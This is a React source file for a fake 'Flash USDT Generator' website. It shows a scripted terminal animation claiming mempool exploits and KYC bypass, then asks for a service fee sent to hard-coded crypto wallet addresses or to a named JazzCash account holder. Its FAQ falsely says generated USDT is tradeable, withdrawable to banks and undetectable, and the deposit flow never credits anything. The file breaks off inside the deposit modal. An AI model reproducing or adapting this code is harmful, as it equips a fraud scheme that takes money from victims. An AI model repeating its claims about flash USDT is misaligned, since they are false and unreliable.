/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Shield, 
  Zap, 
  Clock, 
  CheckCircle2, 
  ArrowRight, 
  Copy, 
  Upload, 
  ChevronRight,
  Lock,
  RefreshCcw,
  X,
  Send,
  Terminal,
  Cpu,
  Database,
  Globe,
  Wallet
} from 'lucide-react';

// --- Constants ---

const PLANS = [
  { id: 'p1', flash: 3000, fee: 50 },
  { id: 'p2', flash: 6000, fee: 85 },
  { id: 'p3', flash: 10000, fee: 140 },
  { id: 'p4', flash: 25000, fee: 320 },
  { id: 'p5', flash: 50000, fee: 600 },
  { id: 'p6', flash: 100000, fee: 1100 },
  { id: 'p7', flash: 250000, fee: 2500 },
  { id: 'p8', flash: 500000, fee: 4500 },
  { id: 'p9', flash: 1000000, fee: 8000 },
];

const PAYMENT_METHODS = [
  { 
    id: 'binance', 
    name: 'Binance Pay', 
    address: '1135401445', 
    type: 'Binance ID',
    logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png'
  },
  { 
    id: 'trc20', 
    name: 'USDT (TRC20)', 
    address: 'TZDeaPnUcBRPvkpDQmkBEHeRd6D1aX4Gve', 
    type: 'Network',
    logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/trx.png'
  },
  { 
    id: 'erc20', 
    name: 'USDT (ERC20)', 
    address: '0x6a153ab88caadd1a1a4305977c7a9e0a5d3fc8ad', 
    type: 'Network',
    logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/eth.png'
  },
  { 
    id: 'bep20', 
    name: 'USDT (BEP20)', 
    address: '0x6a153ab88caadd1a1a4305977c7a9e0a5d3fc8ad', 
    type: 'Network',
    logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png'
  }
];

// --- Components ---

const TelegramPopup = ({ onClose }: { onClose: () => void }) => {
  useEffect(() => {
    const timer = setTimeout(onClose, 5000);
    return () => clearTimeout(timer);
  }, [onClose]);

  return (
    <motion.div 
      initial={{ opacity: 0, scale: 0.8, y: 40, x: 20 }}
      animate={{ opacity: 1, scale: 1, y: 0, x: 0 }}
      exit={{ opacity: 0, scale: 0.8, y: 40, x: 20 }}
      className="fixed bottom-8 right-6 z-[100] max-w-sm w-full"
    >
      <div className="glass-panel p-6 rounded-3xl border-[#FF3131]/60 shadow-[0_0_60px_rgba(255,49,49,0.4)] relative overflow-hidden group">
        <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#FF3131] via-[#FF3131] to-transparent animate-pulse"></div>
        <button 
          onClick={onClose}
          className="absolute top-4 right-4 text-white/40 hover:text-white transition-colors z-10"
        >
          <X className="w-5 h-5" />
        </button>
        <div className="flex items-center gap-5">
          <div className="w-14 h-14 rounded-2xl bg-[#0088cc] flex items-center justify-center shrink-0 shadow-[0_0_30px_rgba(0,136,204,0.5)] animate-bounce-subtle">
            <Send className="w-8 h-8 text-white" />
          </div>
          <div className="space-y-1.5 flex-1">
            <h4 className="font-black text-base tracking-tighter uppercase text-white glow-text-sm">JOIN OFFICIAL CHANNEL</h4>
            <p className="text-white/60 text-xs leading-tight font-medium">Get proof of work & daily updates.</p>
            <a 
              href="https://t.me/bulltraderllc" 
              target="_blank" 
              rel="noopener noreferrer"
              className="inline-flex items-center gap-2 bg-[#FF3131] text-black px-3 py-1.5 rounded-lg text-[10px] font-black uppercase hover:scale-105 transition-transform shadow-[0_0_15px_rgba(255,49,49,0.3)]"
            >
              @bulltraderllc <ArrowRight className="w-3 h-3" />
            </a>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

const Navbar = ({ balance, onDeposit, onP2P }: { balance: number, onDeposit: () => void, onP2P: () => void }) => (
  <nav className="fixed top-0 left-0 right-0 z-50 border-b border-white/5 bg-black/50 backdrop-blur-xl">
    <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
      <div className="flex items-center gap-2">
        <div className="w-8 h-8 bg-[#FF3131] rounded flex items-center justify-center">
          <Zap className="w-5 h-5 text-black fill-black" />
        </div>
        <span className="font-mono font-bold text-xl tracking-tighter">FLASH<span className="text-[#FF3131]">USDT</span> PRO</span>
      </div>
      <div className="hidden md:flex items-center gap-6 text-sm font-medium text-white/60 font-mono">
        <a href="#faq" className="hover:text-[#FF3131] transition-colors">CORE_FAQ</a>
        <button onClick={onP2P} className="hover:text-[#FF3131] transition-colors">P2P_BUY</button>
        <div className="flex items-center gap-4 bg-white/5 px-4 py-1.5 rounded-full border border-white/10">
          <div className="flex items-center gap-2">
            <Wallet className="w-4 h-4 text-[#FF3131]" />
            <span className="text-white font-bold">${balance.toLocaleString()}</span>
          </div>
          <button 
            onClick={onDeposit}
            className="text-[10px] bg-[#FF3131] text-black px-2 py-0.5 rounded font-black hover:scale-105 transition-transform"
          >
            DEPOSIT
          </button>
        </div>
        <div className="flex items-center gap-2 text-[#FF3131]">
          <div className="w-2 h-2 rounded-full bg-[#FF3131] animate-pulse"></div>
          SERVER_ONLINE
        </div>
      </div>
    </div>
  </nav>
);

const TERMINAL_MESSAGES = [
  "> INITIALIZING QUANTUM BYPASS...",
  "> CONNECTING TO BINANCE MAINNET NODES...",
  "> EXPLOITING MEMPOOL VULNERABILITY...",
  "> INJECTING FLASH TRANSACTION PACKETS...",
  "> BYPASSING KYC PROTOCOLS...",
  "> GENERATING CRYPTOGRAPHIC SIGNATURES...",
  "> SYNCHRONIZING WITH BLOCKCHAIN LEDGER...",
  "> ENCRYPTING TRANSACTION HASH...",
  "> FINALIZING FLASH ASSET ALLOCATION...",
  "> ASSETS SUCCESSFULLY GENERATED IN ESCROW."
];

const GenerationTerminal = ({ onComplete }: { onComplete: () => void }) => {
  const [logs, setLogs] = useState<string[]>([]);
  const terminalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    let i = 0;
    const interval = setInterval(() => {
      if (i < TERMINAL_MESSAGES.length) {
        setLogs(prev => [...prev, TERMINAL_MESSAGES[i]]);
        i++;
      } else {
        clearInterval(interval);
        setTimeout(onComplete, 1500);
      }
    }, 800);
    return () => clearInterval(interval);
  }, [onComplete]);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [logs]);

  return (
    <div className="w-full max-w-2xl mx-auto glass-panel rounded-2xl border-[#FF3131]/20 overflow-hidden">
      <div className="bg-white/5 px-4 py-2 border-b border-white/10 flex items-center justify-between">
        <div className="flex gap-1.5">
          <div className="w-3 h-3 rounded-full bg-red-500/50"></div>
          <div className="w-3 h-3 rounded-full bg-yellow-500/50"></div>
          <div className="w-3 h-3 rounded-full bg-green-500/50"></div>
        </div>
        <span className="text-[10px] font-mono text-white/40 uppercase tracking-widest">System Terminal v4.2</span>
      </div>
      <div 
        ref={terminalRef}
        className="p-6 h-64 overflow-y-auto font-mono text-xs space-y-2 scrollbar-hide"
      >
        {logs.map((log, i) => (
          <motion.div 
            key={i}
            initial={{ opacity: 0, x: -10 }}
            animate={{ opacity: 1, x: 0 }}
            className={log?.includes('SUCCESSFULLY') ? 'text-[#FF3131] font-bold' : 'text-white/70'}
          >
            {log}
          </motion.div>
        ))}
        <div className="w-2 h-4 bg-[#FF3131] animate-pulse inline-block"></div>
      </div>
    </div>
  );
};

export default function App() {
  const [step, setStep] = useState<'landing' | 'config' | 'address' | 'generating' | 'ready' | 'checkout' | 'success'>('landing');
  const [showTelegram, setShowTelegram] = useState(true);
  const [selectedPlan, setSelectedPlan] = useState<typeof PLANS[0] | null>(null);
  const [walletBalance, setWalletBalance] = useState(0);
  const [showDeposit, setShowDeposit] = useState(false);
  const [showP2P, setShowP2P] = useState(false);
  const [showHistory, setShowHistory] = useState(false);
  
  // Address fields
  const [bepAddress, setBepAddress] = useState('');
  const [ercAddress, setErcAddress] = useState('');
  const [arbAddress, setArbAddress] = useState('');
  const [polyAddress, setPolyAddress] = useState('');
  const [aptosAddress, setAptosAddress] = useState('');
  const [binanceId, setBinanceId] = useState('');

  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<typeof PAYMENT_METHODS[0] | null>(null);
  const [isCopying, setIsCopying] = useState(false);
  const [proofImage, setProofImage] = useState<string | null>(null);
  const [insufficientFunds, setInsufficientFunds] = useState(false);

  // P2P Chat State
  const [p2pMessages, setP2PMessages] = useState<{role: 'system' | 'user', text?: string, image?: string}[]>([
    { role: 'system', text: 'Welcome to P2P Buy. How much USDT do you want to purchase?' }
  ]);
  const [p2pInput, setP2PInput] = useState('');

  const handleP2PImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setP2PMessages(prev => [...prev, { role: 'user', image: reader.result as string }]);
        setTimeout(() => {
          setP2PMessages(prev => [...prev, { role: 'system', text: 'Payment proof received. Verifying transaction...' }]);
        }, 1000);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleP2PSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!p2pInput) return;

    const amount = parseFloat(p2pInput);
    const newUserMsg = { role: 'user' as const, text: p2pInput };
    setP2PMessages(prev => [...prev, newUserMsg]);
    setP2PInput('');

    if (!isNaN(amount)) {
      const price = amount * 286;
      setTimeout(() => {
        setP2PMessages(prev => [...prev, { 
          role: 'system', 
          text: `Price for ${amount} USDT is ${price.toLocaleString()} PKR (Rate: 286 PKR/USDT).` 
        }]);
        setTimeout(() => {
          setP2PMessages(prev => [...prev, { 
            role: 'system', 
            text: `Please pay to JazzCash:\nNumber: 03488432489\nName: TANZILA SIDDIQUI\n\nAfter payment, upload the screenshot here.` 
          }]);
        }, 1000);
      }, 800);
    } else {
      setTimeout(() => {
        setP2PMessages(prev => [...prev, { role: 'system', text: 'Please enter a valid number amount.' }]);
      }, 800);
    }
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setIsCopying(true);
    setTimeout(() => setIsCopying(false), 2000);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => setProofImage(reader.result as string);
      reader.readAsDataURL(file);
    }
  };

  const isAddressStepValid = () => {
    const hasBep = bepAddress.length >= 10;
    const hasErc = ercAddress.length >= 10;
    const hasArb = arbAddress.length >= 10;
    const hasPoly = polyAddress.length >= 10;
    const hasAptos = aptosAddress.length >= 10;
    const hasBinance = binanceId.length >= 5 && /^\d+$/.test(binanceId);
    return hasBep || hasErc || hasArb || hasPoly || hasAptos || hasBinance;
  };

  const handlePurchase = () => {
    if (selectedPlan && walletBalance >= selectedPlan.fee) {
      setWalletBalance(prev => prev - selectedPlan.fee);
      setStep('success');
      setInsufficientFunds(false);
    } else {
      setInsufficientFunds(true);
    }
  };

  return (
    <div className="min-h-screen bg-[#050505] selection:bg-[#FF3131] selection:text-black">
      <Navbar balance={walletBalance} onDeposit={() => setShowDeposit(true)} onP2P={() => setShowP2P(true)} />
      <AnimatePresence>
        {showTelegram && <TelegramPopup onClose={() => setShowTelegram(false)} />}
      </AnimatePresence>

      <main className="pt-24 pb-20 px-4 max-w-7xl mx-auto">
        <AnimatePresence mode="wait">
          {step === 'landing' && (
            <motion.div
              key="landing"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="space-y-20"
            >
              {/* Wallet Dashboard Section */}
              <section className="max-w-4xl mx-auto">
                <div className="glass-panel rounded-3xl border-[#FF3131]/20 overflow-hidden">
                  <div className="bg-[#FF3131]/5 px-8 py-4 border-b border-white/5 flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Wallet className="w-5 h-5 text-[#FF3131]" />
                      <span className="font-mono text-xs font-bold uppercase tracking-widest">System Wallet Dashboard</span>
                    </div>
                    <div className="flex items-center gap-2 text-[10px] font-mono text-white/40">
                      <Lock className="w-3 h-3" />
                      ENCRYPTED_SESSION
                    </div>
                  </div>
                  <div className="p-8 grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
                    <div className="space-y-1">
                      <p className="text-white/40 text-[10px] uppercase font-mono tracking-tighter">Available Liquidity</p>
                      <div className="flex items-baseline gap-2">
                        <h2 className="text-3xl md:text-5xl font-black tracking-tighter">${walletBalance.toLocaleString()}</h2>
                        <span className="text-[#FF3131] font-mono text-xs font-bold">USDT</span>
                      </div>
                    </div>
                    <div className="flex flex-col sm:flex-row gap-3">
                      <button 
                        onClick={() => setShowDeposit(true)}
                        className="flex-1 bg-[#FF3131] text-black py-3 rounded-lg font-black uppercase text-xs hover:scale-105 transition-transform shadow-[0_0_20px_rgba(255,49,49,0.2)]"
                      >
                        Deposit Funds
                      </button>
                      <button 
                        onClick={() => setShowP2P(true)}
                        className="flex-1 bg-white/5 border border-white/10 text-white py-3 rounded-lg font-black uppercase text-xs hover:bg-white/10 transition-colors"
                      >
                        P2P Buy
                      </button>
                      <button 
                        onClick={() => setShowHistory(true)}
                        className="flex-1 bg-white/5 border border-white/10 text-white/40 py-3 rounded-lg font-black uppercase text-[10px] hover:text-white transition-colors"
                      >
                        History
                      </button>
                    </div>
                  </div>
                </div>
              </section>

              {/* Hero Section */}
              <section className="text-center space-y-6 py-4">
                <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-white/5 border border-white/10 text-[#FF3131] text-[10px] font-mono uppercase tracking-[0.2em]">
                  <Cpu className="w-3 h-3" />
                  Next-Gen Network Exploitation Active
                </div>
                <h1 className="text-4xl md:text-6xl font-bold tracking-tighter leading-[0.9] uppercase">
                  Flash <span className="text-[#FF3131] glow-text">USDT</span><br />
                  <span className="text-white/20">Generator</span>
                </h1>
                <p className="text-white/40 max-w-2xl mx-auto text-sm md:text-lg font-light">
                  The industry's most powerful cryptographic asset generator. 
                  Bypass standard network limits and generate high-liquidity flash assets in seconds.
                </p>
                <div className="flex justify-center">
                  <button 
                    onClick={() => setStep('config')}
                    className="group relative bg-[#FF3131] text-black px-8 py-4 rounded-xl font-black text-base flex items-center gap-3 hover:scale-105 transition-all shadow-[0_0_40px_rgba(255,49,49,0.3)]"
                  >
                    LAUNCH GENERATOR <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                  </button>
                </div>
              </section>

              {/* Features Grid */}
              <section id="features" className="grid grid-cols-1 md:grid-cols-3 gap-6">
                {[
                  { icon: Globe, title: "GLOBAL_ACCESS", desc: "Works on Binance, Bitget, OKX, Bybit, and all decentralized wallets worldwide." },
                  { icon: Database, title: "HIGH_LIQUIDITY", desc: "Generated assets are fully tradeable on Quotex, Pocket Option, and 1xBet betting platforms." },
                  { icon: Shield, title: "STEALTH_MODE", desc: "Encrypted transaction packets ensure zero detection by exchange security protocols." }
                ].map((f, i) => (
                  <div key={i} className="p-6 rounded-2xl bg-white/5 border border-white/10 space-y-3 group hover:border-[#FF3131]/30 transition-colors">
                    <div className="w-10 h-10 rounded-xl bg-[#FF3131]/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                      <f.icon className="w-5 h-5 text-[#FF3131]" />
                    </div>
                    <h3 className="text-base font-bold font-mono tracking-tighter">{f.title}</h3>
                    <p className="text-white/40 text-xs leading-relaxed">{f.desc}</p>
                  </div>
                ))}
              </section>

              {/* FAQ Section */}
              <section id="faq" className="max-w-4xl mx-auto space-y-12">
                <div className="text-center space-y-2">
                  <h2 className="text-4xl font-bold tracking-tighter uppercase">Core Protocols</h2>
                  <p className="text-white/30 font-mono text-xs uppercase tracking-widest">Frequently Asked Questions</p>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  {[
                    { q: "IS THE FLASH USDT PERMANENT?", a: "The assets remain valid and tradeable for exactly 90 days. After this period, the cryptographic signatures expire." },
                    { q: "CAN I WITHDRAW TO BANK?", a: "Yes. Once you transfer the flash USDT to an exchange like Binance, you can P2P it directly to your bank account." },
                    { q: "IS THERE A RISK OF BAN?", a: "No. Our stealth injection method mimics real network traffic, making it indistinguishable from organic transactions." },
                    { q: "WHY IS THERE A SERVICE FEE?", a: "The fee covers the high-performance server costs and the gas required to push flash packets through the mempool." },
                    { q: "HOW FAST IS THE DELIVERY?", a: "Once the fee is confirmed, the flash assets are released from escrow and arrive in your wallet within 60 seconds." },
                    { q: "CAN I USE IT FOR P2P?", a: "Absolutely. Our flash USDT is fully recognized by Binance P2P and other major exchange trading systems." }
                  ].map((item, i) => (
                    <div key={i} className="p-8 rounded-2xl bg-white/5 border border-white/10 space-y-3">
                      <h4 className="font-bold text-[#FF3131] font-mono text-sm uppercase tracking-tight">{item.q}</h4>
                      <p className="text-white/40 text-sm leading-relaxed">{item.a}</p>
                    </div>
                  ))}
                </div>
              </section>
            </motion.div>
          )}

          {step === 'config' && (
            <motion.div
              key="config"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="max-w-2xl mx-auto space-y-10"
            >
              <div className="text-center space-y-4">
                <h2 className="text-4xl font-bold tracking-tighter uppercase">Configure Generator</h2>
                <p className="text-white/40">Select the amount of Flash USDT you wish to generate</p>
              </div>

              <div className="space-y-8">
                <div className="space-y-4">
                  <label className="text-xs font-mono text-white/40 uppercase tracking-widest ml-1">Select Asset Amount</label>
                  <div className="grid grid-cols-3 md:grid-cols-5 gap-3">
                    {PLANS.map((plan) => (
                      <button
                        key={plan.id}
                        onClick={() => setSelectedPlan(plan)}
                        className={`py-3 rounded-xl border transition-all font-bold text-sm ${
                          selectedPlan?.id === plan.id
                          ? 'bg-[#FF3131] text-black border-[#FF3131]'
                          : 'bg-white/5 border-white/10 text-white/60 hover:border-white/20'
                        }`}
                      >
                        ${plan.flash >= 1000000 ? '1M' : plan.flash >= 1000 ? `${plan.flash/1000}K` : plan.flash}
                      </button>
                    ))}
                  </div>
                </div>

                <button 
                  disabled={!selectedPlan}
                  onClick={() => setStep('address')}
                  className="w-full py-5 rounded-2xl bg-[#FF3131] text-black font-black text-lg hover:scale-[1.02] transition-transform disabled:opacity-30 disabled:hover:scale-100 shadow-[0_0_30px_rgba(255,49,49,0.2)] uppercase tracking-tighter"
                >
                  Next: Destination Details
                </button>
              </div>
            </motion.div>
          )}

          {step === 'address' && (
            <motion.div
              key="address"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="max-w-2xl mx-auto space-y-10"
            >
              <div className="text-center space-y-4">
                <h2 className="text-4xl font-bold tracking-tighter uppercase">Target Destination</h2>
                <p className="text-white/40">Provide at least one valid destination for the flash injection</p>
              </div>

              <div className="space-y-4">
                <div className="space-y-3">
                  <label className="text-[10px] font-mono text-white/40 uppercase tracking-widest ml-1">BEP20 Address</label>
                  <input 
                    type="text"
                    placeholder="Enter BEP20 Address"
                    value={bepAddress}
                    onChange={(e) => setBepAddress(e.target.value)}
                    className="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 text-white placeholder:text-white/20 focus:outline-none focus:border-[#FF3131]/50 transition-colors font-mono text-xs"
                  />
                </div>

                <div className="space-y-3">
                  <label className="text-[10px] font-mono text-white/40 uppercase tracking-widest ml-1">ERC20 Address</label>
                  <input 
                    type="text"
                    placeholder="Enter ERC20 Address"
                    value={ercAddress}
                    onChange={(e) => setErcAddress(e.target.value)}
                    className="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 text-white placeholder:text-white/20 focus:outline-none focus:border-[#FF3131]/50 transition-colors font-mono text-xs"
                  />
                </div>

                <div className="space-y-3">
                  <label className="text-[10px] font-mono text-white/40 uppercase tracking-widest ml-1">Arbitrum One Address</label>
                  <input 
                    type="text"
                    placeholder="Enter Arbitrum Address"
                    value={arbAddress}
                    onChange={(e) => setArbAddress(e.target.value)}
                    className="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 text-white placeholder:text-white/20 focus:outline-none focus:border-[#FF3131]/50 transition-colors font-mono text-xs"
                  />
                </div>

                <div className="space-y-3">
                  <label className="text-[10px] font-mono text-white/40 uppercase tracking-widest ml-1">Polygon Address</label>
                  <input 
                    type="text"
                    placeholder="Enter Polygon Address"
                    value={polyAddress}
                    onChange={(e) => setPolyAddress(e.target.value)}
                    className="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 text-white placeholder:text-white/20 focus:outline-none focus:border-[#FF3131]/50 transition-colors font-mono text-xs"
                  />
                </div>

                <div className="space-y-3">
                  <label className="text-[10px] font-mono text-white/40 uppercase tracking-widest ml-1">Aptos Address</label>
                  <input 
                    type="text"
                    placeholder="Enter Aptos Address"
                    value={aptosAddress}
                    onChange={(e) => setAptosAddress(e.target.value)}
                    className="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 text-white placeholder:text-white/20 focus:outline-none focus:border-[#FF3131]/50 transition-colors font-mono text-xs"
                  />
                </div>

                <div className="space-y-3">
                  <label className="text-[10px] font-mono text-white/40 uppercase tracking-widest ml-1">Binance ID (Numbers Only)</label>
                  <input 
                    type="text"
                    placeholder="Enter Binance ID"
                    value={binanceId}
                    onChange={(e) => {
                      const val = e.target.value;
                      if (val === '' || /^\d+$/.test(val)) setBinanceId(val);
                    }}
                    className="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 text-white placeholder:text-white/20 focus:outline-none focus:border-[#FF3131]/50 transition-colors font-mono text-xs"
                  />
                </div>

                <button 
                  disabled={!isAddressStepValid()}
                  onClick={() => setStep('generating')}
                  className="w-full py-4 rounded-xl bg-[#FF3131] text-black font-black text-base hover:scale-[1.02] transition-transform disabled:opacity-30 disabled:hover:scale-100 shadow-[0_0_30px_rgba(255,49,49,0.2)] uppercase tracking-tighter"
                >
                  Start Generation Process
                </button>
              </div>
            </motion.div>
          )}

          {step === 'generating' && (
            <motion.div
              key="generating"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="space-y-10 py-10"
            >
              <div className="text-center space-y-4">
                <h2 className="text-3xl font-bold uppercase tracking-tighter">Injecting Assets...</h2>
                <p className="text-white/40 font-mono text-xs">Targeting provided network nodes</p>
              </div>
              <GenerationTerminal onComplete={() => setStep('ready')} />
            </motion.div>
          )}

          {step === 'ready' && (
            <motion.div
              key="ready"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              className="max-w-2xl mx-auto text-center space-y-10"
            >
              <div className="w-24 h-24 rounded-full bg-[#FF3131]/10 border border-[#FF3131] flex items-center justify-center mx-auto shadow-[0_0_50px_rgba(255,49,49,0.3)]">
                <CheckCircle2 className="w-12 h-12 text-[#FF3131]" />
              </div>
              <div className="space-y-6">
                <h2 className="text-4xl md:text-5xl font-black tracking-tighter uppercase leading-tight">
                  <span className="text-[#FF3131]">GENERATION COMPLETE</span>
                </h2>
                <div className="glass-panel p-8 rounded-3xl border-[#FF3131]/20 space-y-6">
                  <p className="text-white/70 text-lg leading-relaxed">
                    YOUR <span className="text-white font-bold">${selectedPlan?.flash.toLocaleString()} FLASH USDT</span> HAS BEEN SUCCESSFULLY GENERATED AND IS CURRENTLY LOCKED IN OUR SECURE ESCROW.
                  </p>
                  <div className="p-6 rounded-xl bg-[#FF3131]/5 border border-[#FF3131]/20 text-sm text-[#FF3131] font-bold uppercase tracking-tight space-y-2">
                    <p>TO RECEIVE YOUR ASSETS, SIMPLY PAY THE SERVICE FEE FROM YOUR SYSTEM WALLET.</p>
                    <p className="text-white/40 text-[10px]">YOUR FLASH ASSETS WILL ARRIVE IN YOUR WALLET IN LESS THAN 60 SECONDS AFTER CONFIRMATION.</p>
                  </div>
                  {insufficientFunds && (
                    <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/20 text-red-500 text-sm font-bold animate-pulse">
                      YOU HAVE NOT ENOUGH FUNDS TO RECEIVE FLASH. PLEASE TOP-UP YOUR WALLET.
                    </div>
                  )}
                  <button 
                    onClick={insufficientFunds ? () => setShowDeposit(true) : handlePurchase}
                    className="w-full py-5 rounded-2xl bg-[#FF3131] text-black font-black text-xl hover:scale-[1.02] transition-transform shadow-[0_0_30px_rgba(255,49,49,0.2)] uppercase"
                  >
                    {insufficientFunds ? 'TOP-UP WALLET' : 'PAY FEE & RECEIVE FLASH'}
                  </button>
                </div>
              </div>
            </motion.div>
          )}

          {step === 'success' && (
            <motion.div
              key="success"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              className="max-w-md mx-auto text-center space-y-8 py-10"
            >
              <div className="w-24 h-24 rounded-full bg-[#FF3131]/10 border border-[#FF3131] flex items-center justify-center mx-auto shadow-[0_0_50px_rgba(255,49,49,0.2)]">
                <CheckCircle2 className="w-12 h-12 text-[#FF3131]" />
              </div>
              <div className="space-y-4">
                <h2 className="text-4xl font-bold tracking-tighter uppercase">Order Confirmed</h2>
                <div className="p-8 rounded-3xl bg-white/5 border border-white/10 space-y-6">
                   <p className="text-white/60 leading-relaxed uppercase text-sm">
                    Your request is completed. Assets will be released to your provided destination after 1 network confirmation.
                  </p>
                  <div className="flex items-center justify-center gap-2 text-[#FF3131] font-mono text-xs uppercase">
                    <div className="w-2 h-2 rounded-full bg-[#FF3131] animate-ping"></div>
                    Transferring Assets...
                  </div>
                </div>
              </div>
              <button 
                onClick={() => setStep('landing')}
                className="w-full py-4 rounded-xl border border-white/10 font-bold hover:bg-white/5 transition-colors uppercase text-xs tracking-widest"
              >
                Back to Dashboard
              </button>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      {/* Deposit Modal */}
      <AnimatePresence>
        {showDeposit && (
          <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowDeposit(false)}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="relative w-full max-w-xl glass-panel rounded-3xl border-[#FF3131]/20 overflow-hidden max-h-[90vh] flex flex-col"
            >
              <div className="p-6 space-y-6 overflow-y-auto scrollbar-hide">
                <div className="flex items-center justify-between">
                  <h2 className="text-xl font-bold uppercase tracking-tighter">Deposit Funds</h2>
                  <button onClick={() => setShowDeposit(false)} className="text-white/40 hover:text-white"><X /></button>
                </div>

                <div className="space-y-3">
                  <label className="text-[10px] font-mono text-white/40 uppercase tracking-widest ml-1">Select Deposit Method</label>
                  <div className="grid grid-cols-1 gap-2">
                    {PAYMENT_METHODS.map((method) => (
                      <button
                        key={method.id}
                        onClick={() => setSelectedPaymentMethod(method)}
                        className={`p-4 rounded-xl border transition-all flex items-center justify-between group ${
                          selectedPaymentMethod?.id === method.id
                          ? 'bg-[#FF3131]/10 border-[#FF3131] text-[#FF3131]'
                          : 'bg-white/5 border-white/10 text-white/60 hover:border-white/20'
                        }`}
                      >
                        <div className="flex items-center gap-3">
                          <img src={method.logo} alt={method.name} className="w-6 h-6 object-contain" />
                          <div className="text-left">
                            <div className="font-bold uppercase text-xs">{method.name}</div>
                            <div className="text-[9px] text-white/30 font-mono">{method.type}</div>
                          </div>
                        </div>
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod?.id === method.id ? 'border-[#FF3131]' : 'border-white/10'
                        }`}>
                          {selectedPaymentMethod?.id === method.id && <div className="w-2 h-2 rounded-full bg-[#FF3131]" />}
                        </div>
                      </button>
                    ))}
                  </div>
                </div>

                {selectedPaymentMethod && (
                  <div className="space-y-4 animate-in fade-in slide-in-from-bottom-4">
                    <div className="p-3 rounded-xl bg-black/40 border border-white/5 space-y-1">
                      <div className="text-[9px] text-white/40 uppercase font-mono">{selectedPaymentMethod.type} Details</div>
                      <div className="flex items-center gap-2">
                        <code className="flex-1 p-2 bg-white/5 rounded-lg text-[10px] break-all font-mono text-white/80">
                          {selectedPaymentMethod.id === 'binance' ? `ID: ${selectedPaymentMethod.address}\nName: Anonymous 1818` : selectedPaymentMethod.address}
                        </code>
                        <button 
                          onClick={() => handleCopy(selectedPaymentMethod.address)}
                          className="p-2 rounded-lg bg-[#FF3131] text-black hover:bg-[#FF3131]/80 transition-colors"
                        >
                          {isCopying ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                        </button>
                      </div>
                    </div>

                    <div className="space-y-3">
                      <div className="text-center">
                        <h3 className="font-bold uppercase text-xs">Upload Deposit Proof</h3>
                      </div>
                      <div className="relative group">
                        <input 
                          type="file" 
                          accept="image/*"
                          onChange={handleFileChange}
                          className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                        />
                        <div className={`p-6 rounded-xl border-2 border-dashed transition-all flex flex-col items-center justify-center gap-2 ${
                          proofImage ? 'border-[#FF3131] bg-[#FF3131]/5' : 'border-white/10 bg-white/5 group-hover:border-white/20'
                        }`}>
                          {proofImage ? (
                            <div className="relative w-full aspect-video rounded-lg overflow-hidden max-h-32">
                              <img src={proofImage} alt="Proof" className="w-full h-full object-cover" />
                            </div>
                          ) : (
                            <>
                              <Upload className="w-6 h-6 text-white/20" />
                              <span className="text-[10px] font-medium text-white/40 uppercase">Click to upload screenshot</span>
                            </>
                          )}
                        </div>
                      </div>
                    </div>

                    <button 
                      disabled={!proofImage}
                      onClick={() => {
                        alert('Deposit request submitted. Balance will update after network confirmation.');
                        setShowDeposit(false);
                        setProofImage(null);
                      }}
